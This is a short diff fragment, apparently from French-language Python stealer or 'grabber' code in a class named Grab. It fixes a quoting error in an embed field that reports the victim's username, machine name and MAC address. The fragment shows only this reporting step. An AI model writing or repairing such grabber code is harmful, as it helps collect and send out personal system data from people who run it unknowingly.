@@ -1217,7 +1217,7 @@ class Grab:
                         },
                         {
                             "name": "**Infos du PC**",
-                            "value": f'Nom de l'utilisateur: {computer_username}\nNom de la machine: {computer_name}\nAdresse MAC: {mac_address}',
+                            "value": f"Nom de l'utilisateur: {computer_username}\nNom de la machine: {computer_name}\nAdresse MAC: {mac_address}",
                             "inline": True
                         },
                         {
